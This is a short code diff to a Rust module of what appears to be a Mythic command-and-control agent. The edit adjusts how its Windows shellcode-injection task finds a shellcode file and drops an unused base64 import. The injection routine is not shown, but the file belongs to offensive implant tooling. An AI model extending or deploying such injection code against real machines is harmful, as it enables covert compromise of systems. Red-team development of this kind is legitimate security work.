@@ -2,7 +2,6 @@ use std::mem;
 use std::ptr;
 use crate::{AgentTask, mythic_success, mythic_error};
 use crate::agent::ShinjectArgs;
-use base64::{Engine as _, engine::general_purpose};
 
 #[cfg(target_os = "windows")]
 use winapi::shared::minwindef::{FALSE, DWORD, LPVOID};
@@ -50,8 +49,8 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn s
     // Try to read the file from various possible locations
     let possible_paths = vec![
         std::path::Path::new(&args.shellcode),
-        std::env::temp_dir().join(&args.shellcode),
-        std::env::current_dir()?.join(&args.shellcode),
+        &std::env::temp_dir().join(&args.shellcode),
+        &std::env::current_dir()?.join(&args.shellcode),
     ];
     
     let mut found_file = false;
